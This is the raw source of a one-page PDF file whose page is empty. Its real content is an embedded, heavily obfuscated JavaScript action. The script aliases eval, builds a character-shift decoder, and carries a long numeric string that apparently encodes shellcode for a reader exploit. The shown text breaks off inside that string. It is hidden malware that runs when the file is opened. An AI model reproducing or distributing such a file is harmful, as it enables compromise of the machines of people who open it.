%PDF-1.3
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 26719>>
stream
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 300.00 400.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Names [(HtYfjPssa) 7 0 R ]
>>
endobj
7 0 obj
<<
/S /JavaScript
/JS (
/*RRRRRRRRRRRR*/var qVPqbADej="r";/*RRRRRRRRRRRR*/var ISRrTGnaf="deA";
var KjvnEeOBWWr = "ch"+"a"+qVPqbADej+"Co"+ISRrTGnaf;
var wkkbp7enXwBmf = 222+1; var EbKlpiN90o = 31+1; var il21 = eval; var p0ynQCtPj6 = 64+1; 
/*RRRRRRRRRRRR*/var B5y10sC6="r";/*RRRRRRRRRRRR*/var LfCyceRT="tr";/*RRRRRRRRRRRR*/var KTYR0a8BZ="in";/*RRRRRRRRRRRR*/var EBLIqg6mCmc="r";
var gaj2g5=B5y10sC6+"etu"+"rn"+" "+"S"+LfCyceRT+KTYR0a8BZ+"g.f"+EBLIqg6mCmc+"omC"+"ha"+"rC"+"ode"+"((((c = c.KjvnEeOBWWr(0)) & wkkbp7enXwBmf) - 52) %26 + (c & EbKlpiN90o) + p0ynQCtPj6);";
s = "27 135 114 131 49 129 114 138 125 128 114 117 49 78 49 134 127 118 132 116 114 129 118 57 51 54 134 65 82 65 82 54 134 65 82 65 82 54 134 65 82 65 82 51 60 51 54 134 86 66 85 74 54 134 68 69 85 74 54 134 70 73 67 69 54 134 70 73 70 73 54 134 68 68 70 73 54 134 83 68 85 83 54 134 65 68 66 84 54 134 68 66 84 68 54 134 71 71 84 74 54 134 86 74 73 66 54 134 87 82 71 70 54 134 68 65 73 65 54 134 69 65 67 66 54 134 87 82 86 67 54 134 66 72 84 74 54 134 67 66 67 67 54 134 69 74 67 66 54 134 65 66 67 66 54 134 67 66 67 66 54 134 67 66 69 83 54 134 87 66 85 86 54 134 67 66 74 73 54 134 67 66 68 66 54 134 82 82 67 66 54 134 84 82 85 74 54 134 72 87 67 69 54 134 73 70 85 67 54 134 87 66 85 86 54 134 85 72 84 74 54 134 85 86 85 86 54 134 84 74 85 86 54 134 67 67 66 84 54 134 67 66 67 66 54 134 85 74 82 82 54 134 66 74 84 74 54 134 67 66 67 66 54 134 84 74 67 66 54 134 67 65 71 84 54 134 67 66 67 66 54 134 71 72 84 74 54 134 67 66 67 66 54 134 84 74 67 66 54 134 67 67 87 82 54 134 67 66 67 66 54 134 85 74 82 82 54 134 65 68 84 74 54 134 67 66 67 66 54 134 84 74 67 66 54 134 67 65 71 70 54 134 67 66 67 66 54 134 66 66 84 74 54 134 67 66 67 66 54 134 84 74 67 66 54 134 67 67 82 73 54 134 67 66 67 66 54 134 85 74 82 82 54 134 67 85 84 74 54 134 67 66 67 66 54 134 84 74 67 66 54 134 67 65 69 65 54 134 67 66 67 66 54 134 68 83 84 74 54 134 67 66 67 66 54 134 84 82 67 66 54 134 72 67 72 74 54 134 87 85 82 82 54 134 69 83 72 67 54 134 69 74 71 66 54 134 68 66 67 66 54 134 67 66 67 66 54 134 84 74 72 71 54 134 67 68 74 65 54 134 67 66 67 66 54 134 84 69 84 74 54 134 67 66 67 66 54 134 72 74 67 66 54 134 72 67 86 67 54 134 87 85 82 82 54 134 69 83 72 67 54 134 69 74 65 66 54 134 68 66 67 66 54 134 67 66 67 66 54 134 84 74 72 71 54 134 67 68 83 73 54 134 67 66 67 66 54 134 86 84 84 74 54 134 67 66 67 66 54 134 72 74 67 66 54 134 72 71 86 67 54 134 66 85 84 74 54 134 67 66 67 70 54 134 82 82 67 66 54 134 66 67 85 74 54 134 71 73 86 73 54 134 86 66 66 67 54 134 86 67 74 66 54 134 85 68 85 85 54 134 82 84 73 87 54 134 85 86 71 71 54 134 86 67 72 86 54 134 66 87 72 82 54 134 67 71 86 72 54 134 66 87 74 74 54 134 72 86 82 73 54 134 69 72 67 65 54 134 86 71 66 87 54 134 67 69 71 71 54 134 84 66 85 86 54 134 84 73 86 67 54 134 67 70 83 69 54 134 67 66 67 66 54 134 82 65 72 82 54 134 68 70 84 85 54 134 67 66 67 65 54 134 82 82 67 66 54 134 66 87 87 70 54 134 67 68 86 71 54 134 69 84 69 67 54 134 65 66 69 70 54 134 86 71 66 87 54 134 67 70 71 68 54 134 69 67 65 86 54 134 65 68 65 66 54 134 86 68 82 67 54 134 66 67 67 74 54 134 72 66 86 66 54 134 69 74 72 66 54 134 67 65 67 70 54 134 67 66 67 66 54 134 72 67 72 68 54 134 84 74 72 66 54 134 67 67 86 65 54 134 67 66 67 66 54 134 87 66 85 86 54 134 85 85 82 82 54 134 86 71 82 82 54 134 86 66 82 67 54 134 66 87 67 74 54 134 68 74 82 83 54 134 87 82 82 70 54 134 67 67 70 70 54 134 84 82 71 66 54 134 66 87 85 72 54 134 67 66 86 72 54 134 66 67 65 68 54 134 66 87 87 68 54 134 72 66 82 74 54 134 82 67 67 65 54 134 72 70 84 85 54 134 86 66 66 67 54 134 87 82 66 67 54 134 86 85 82 82 54 134 85 74 82 67 54 134 70 84 72 70 54 134 66 87 67 73 54 134 68 85 82 73 54 134 82 67 67 65 54 134 67 70 86 66 54 134 85 68 84 82 54 134 86 85 82 82 54 134 87 73 82 82 54 134 86 67 82 67 54 134 66 67 68 66 54 134 66 87 86 66 54 134 71 67 86 71 54 134 67 65 65 85 54 134 67 66 67 66 54 134 72 65 67 66 54 134 72 66 72 67 54 134 72 66 72 66 54 134 72 66 72 66 54 134 72 71 72 66 54 134 84 74 72 66 54 134 67 67 66 73 54 134 67 66 67 66 54 134 68 73 84 74 54 134 67 66 67 66 54 134 69 70 67 66 54 134 67 70 73 65 54 134 67 66 67 66 54 134 82 84 67 66 54 134 69 66 73 66 54 134 85 86 85 86 54 134 84 74 85 86 54 134 67 67 66 71 54 134 67 66 67 66 54 134 87 82 66 67 54 134 72 67 72 67 54 134 72 67 72 67 54 134 87 66 85 86 54 134 66 74 82 66 54 134 82 66 84 74 54 134 84 73 66 74 54 134 67 86 70 69 54 134 70 74 82 65 54 134 83 66 67 69 54 134 83 66 83 66 54 134 70 70 83 66 54 134 72 69 67 72 54 134 84 85 82 82 54 134 71 66 82 84 54 134 85 86 67 69 54 134 84 74 84 66 54 134 85 86 65 87 54 134 85 86 85 86 54 134 84 74 86 67 54 134 85 86 65 74 54 134 85 86 85 86 54 134 68 65 74 74 54 134 67 70 67 65 54 134 86 68 82 66 54 134 67 66 67 85 54 134 68 82 84 74 54 134 85 86 85 86 54 134 66 67 85 86 54 134 72 66 86 66 54 134 84 74 72 70 54 134 67 66 72 70 54 134 67 66 67 66 54 134 84 74 72 66 54 134 67 68 82 82 54 134 67 66 67 66 54 134 87 66 85 86 54 134 82 66 66 72 54 134 65 70 66 85 54 134 70 71 67 66 54 134 84 74 67 83 54 134 67 68 71 65 54 134 67 66 67 66 54 134 85 86 66 67 54 134 85 86 72 71 54 134 84 74 87 66 54 134 67 65 85 82 54 134 67 66 67 66 54 134 85 86 69 74 54 134 67 66 67 66 54 134 85 86 67 66 54 134 84 74 87 66 54 134 85 87 84 74 54 134 85 86 85 86 54 134 72 71 72 67 54 134 66 67 72 72 54 134 72 66 86 66 54 134 84 74 72 70 54 134 67 66 68 87 54 134 67 66 67 66 54 134 84 74 72 66 54 134 67 68 72 69 54 134 67 66 67 66 54 134 87 66 85 86 54 134 82 66 66 72 54 134 65 70 66 85 54 134 70 71 67 66 54 134 84 74 67 83 54 134 67 68 67 82 54 134 67 66 67 66 54 134 85 86 66 67 54 134 85 86 72 71 54 134 72 74 87 66 54 134 72 86 72 87 54 134 86 67 72 82 54 134 67 68 84 82 54 134 86 67 72 74 54 134 85 73 84 74 54 134 85 86 85 86 54 134 72 72 85 86 54 134 82 67 72 71 54 134 67 74 84 85 54 134 85 85 82 82 54 134 67 74 69 83 54 134 66 87 72 71 54 134 70 71 85 86 54 134 84 74 68 70 54 134 67 68 72 84 54 134 67 66 67 66 54 134 87 66 85 86 54 134 85 85 82 82 54 134 69 65 69 74 54 134 69 69 69 84 54 134 69 74 67 66 54 134 71 69 71 73 54 134 70 68 71 72 54 134 85 70 82 82 54 134 67 74 74 73 54 134 67 66 67 66 54 134 85 67 67 66 54 134 70 69 73 72 54 134 69 83 65 86 54 134 66 87 67 66 54 134 70 70 85 86 54 134 65 66 65 70 54 134 65 70 84 74 54 134 67 66 67 68 54 134 85 86 67 66 54 134 82 82 87 66 54 134 84 74 85 74 54 134 67 65 86 82 54 134 67 66 67 66 54 134 87 66 85 86 54 134 85 74 66 82 54 134 67 74 70 70 54 134 82 82 66 72 54 134 65 70 71 70 54 134 66 87 65 66 54 134 67 66 85 86 54 134 85 86 66 87 54 134 65 70 70 70 54 134 84 74 68 85 54 134 67 65 84 86 54 134 67 66 67 66 54 134 87 66 85 86 54 134 86 70 82 67 54 134 72 86 68 66 54 134 74 74 72 87 54 134 67 66 67 65 54 134 67 66 67 66 54 134 69 74 86 67 54 134 69 87 69 86 54 134 67 66 67 66 54 134 70 69 69 74 54 134 69 85 70 68 54 134 84 82 69 84 54 134 82 84 68 69 54 134 65 70 71 70 54 134 72 66 67 70 54 134 65 68 84 74 54 134 85 86 85 87 54 134 72 66 85 86 54 134 71 83 84 74 54 134 67 66 67 68 54 134 84 73 67 66 54 134 85 87 84 68 54 134 85 86 85 86 54 134 84 72 84 74 54 134 85 86 85 86 54 134 82 67 85 86 54 134 67 74 86 70 54 134 69 83 86 67 54 134 69 74 69 85 54 134 70 70 69 87 54 134 69 85 69 70 54 134 68 69 84 82 54 134 71 70 82 84 54 134 67 70 65 70 54 134 84 74 72 66 54 134 85 84 85 82 54 134 85 86 85 86 54 134 84 74 72 66 54 134 67 68 65 67 54 134 67 66 67 66 54 134 74 82 84 73 54 134 85 86 85 87 54 134 84 74 85 86 54 134 85 86 84 72 54 134 85 86 85 86 54 134 86 70 82 67 54 134 86 67 67 74 54 134 66 67 69 74 54 134 67 66 66 68 54 134 69 74 67 66 54 134 70 67 70 69 54 134 70 68 69 69 54 134 68 69 84 82 54 134 71 70 82 84 54 134 67 70 65 70 54 134 84 74 72 66 54 134 85 84 87 65 54 134 85 86 85 86 54 134 84 74 72 66 54 134 67 65 85 73 54 134 67 66 67 66 54 134 83 65 84 73 54 134 85 86 85 87 54 134 84 74 85 86 54 134 85 86 84 72 54 134 85 86 85 86 54 134 86 70 82 67 54 134 86 67 67 74 54 134 69 67 69 74 54 134 70 71 70 72 54 134 69 74 67 66 54 134 69 74 70 67 54 134 69 86 69 70 54 134 68 69 84 82 54 134 71 70 82 84 54 134 67 70 65 70 54 134 84 74 72 66 54 134 85 84 73 71 54 134 85 86 85 86 54 134 84 74 72 66 54 134 67 65 86 86 54 134 67 66 67 66 54 134 69 71 84 73 54 134 85 86 85 87 54 134 84 74 85 86 54 134 85 86 84 72 54 134 85 86 85 86 54 134 86 70 82 67 54 134 86 67 67 74 54 134 70 72 69 74 54 134 70 74 69 71 54 134 84 82 67 66 54 134 82 84 68 69 54 134 65 70 71 70 54 134 72 66 67 70 54 134 82 68 84 74 54 134 85 86 85 84 54 134 72 66 85 86 54 134 73 83 84 74 54 134 67 66 67 65 54 134 84 73 67 66 54 134 85 87 71 68 54 134 85 86 85 86 54 134 84 72 84 74 54 134 85 86 85 86 54 134 82 67 85 86 54 134 67 70 86 70 54 134 84 74 86 67 54 134 67 65 73 82 54 134 67 66 67 66 54 134 68 82 69 74 54 134 71 72 86 72 54 134 72 66 70 73 54 134 86 72 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 65 83 71 54 134 67 66 67 66 54 134 84 85 69 74 54 134 67 67 83 71 54 134 72 66 67 85 54 134 74 68 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 65 82 67 54 134 67 66 67 66 54 134 73 83 69 74 54 134 67 84 85 85 54 134 72 66 70 85 54 134 83 87 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 65 69 86 54 134 67 66 67 66 54 134 84 84 69 74 54 134 84 86 72 72 54 134 72 66 66 72 54 134 82 83 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 65 72 82 54 134 67 66 67 66 54 134 85 66 69 74 54 134 67 70 82 83 54 134 72 66 72 86 54 134 70 72 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 85 87 85 71 54 134 85 86 85 86 54 134 70 74 69 74 54 134 87 82 69 74 54 134 72 66 68 85 54 134 69 68 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 65 66 67 54 134 67 66 67 66 54 134 84 86 69 74 54 134 84 66 86 87 54 134 72 66 69 66 54 134 71 87 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 65 68 86 54 134 67 66 67 66 54 134 74 66 69 74 54 134 65 84 71 73 54 134 72 66 87 82 54 134 66 83 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 85 86 66 72 54 134 85 86 85 86 54 134 73 82 69 74 54 134 83 82 72 87 54 134 72 66 68 87 54 134 65 72 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 85 87 73 71 54 134 85 86 85 86 54 134 72 73 69 74 54 134 82 65 83 71 54 134 72 66 67 68 54 134 68 68 84 74 54 134 67 66 67 65 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 66 84 67 54 134 67 66 67 66 54 134 70 87 69 74 54 134 84 68 87 74 54 134 72 66 70 67 54 134 85 87 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 66 86 86 54 134 67 66 67 66 54 134 83 87 69 74 54 134 74 82 85 73 54 134 72 66 66 69 54 134 84 83 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 85 87 83 68 54 134 85 86 85 86 54 134 72 71 69 74 54 134 74 69 73 66 54 134 72 66 74 82 54 134 87 72 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 85 87 70 87 54 134 85 86 85 86 54 134 68 83 69 74 54 134 68 87 70 83 54 134 72 66 67 68 54 134 86 68 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 85 87 69 83 54 134 85 86 85 86 54 134 84 66 69 74 54 134 66 66 72 82 54 134 72 66 83 70 54 134 73 87 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 85 87 72 72 54 134 85 86 85 86 54 134 83 71 69 74 54 134 84 68 86 73 54 134 72 66 73 67 54 134 83 83 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 85 87 71 68 54 134 85 86 85 86 54 134 69 74 69 74 54 134 86 69 65 70 54 134 72 66 74 67 54 134 82 72 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 66 72 71 54 134 67 66 67 66 54 134 70 68 69 74 54 134 74 67 85 87 54 134 72 66 68 72 54 134 70 68 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 85 87 71 70 54 134 85 86 85 86 54 134 68 67 84 82 54 134 69 69 69 83 54 134 84 74 72 66 54 134 85 82 85 71 54 134 85 86 85 86 54 134 84 74 72 66 54 134 85 87 73 82 54 134 85 86 85 86 54 134 74 71 84 73 54 134 85 86 85 85 54 134 84 74 85 86 54 134 85 86 84 74 54 134 85 86 85 86 54 134 84 74 86 67 54 134 85 84 73 73 54 134 85 86 85 86 54 134 71 86 69 74 54 134 71 86 84 86 54 134 72 66 67 69 54 134 66 87 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 84 74 86 67 54 134 67 66 67 86 54 134 67 66 67 66 54 134 82 87 69 74 54 134 67 87 71 87 54 134 72 66 84 85 54 134 65 83 84 74 54 134 67 66 67 66 54 134 82 67 67 66 54 134 67 74 86 70 54 134 66 67 86 67 54 134 69 70 86 66 54 134 71 66 82 82 54 134 82 69 66 66 54 134 70 74 86 66 54 134 66 87 68 66 54 134 71 66 82 82 54 134 66 87 67 85 54 134